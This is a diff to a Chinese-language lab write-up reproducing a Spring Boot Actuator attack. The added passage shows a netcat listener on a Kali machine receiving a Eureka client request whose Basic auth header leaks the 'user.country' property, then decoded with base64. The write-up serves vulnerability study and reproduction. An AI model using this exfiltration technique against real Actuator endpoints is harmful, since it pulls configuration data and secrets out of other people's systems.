@@ -80,6 +80,32 @@ root@kali:/tmp# echo MzgzNDY6bnVsbA== |base64 -d
 和上面的 pid 信息一样
 
 
+同样 获取 `user.country`参数,步骤也一样
+
+结果:
+```
+root@kali:/tmp# nc -lvvp 2555
+listening on [any] 2555 ...
+connect to [10.20.24.191] from kali [10.20.24.191] 38994
+GET /xstream/apps/ HTTP/1.1
+Accept: application/json
+DiscoveryIdentity-Name: DefaultClient
+DiscoveryIdentity-Version: 1.4
+DiscoveryIdentity-Id: 10.20.24.191
+Accept-Encoding: gzip
+Host: 10.20.24.191:2555
+Connection: Keep-Alive
+User-Agent: Java-EurekaClient/v1.4.11
+Authorization: Basic VVM6bnVsbA==
+
+ sent 0, rcvd 310
+```
+base64 解码得到
+```
+root@kali:/tmp# echo VVM6bnVsbA== |base64 -d
+US:null
+
+```
 
 
 # SpringBoot_Actuator_RCE 漏洞复现 (二)
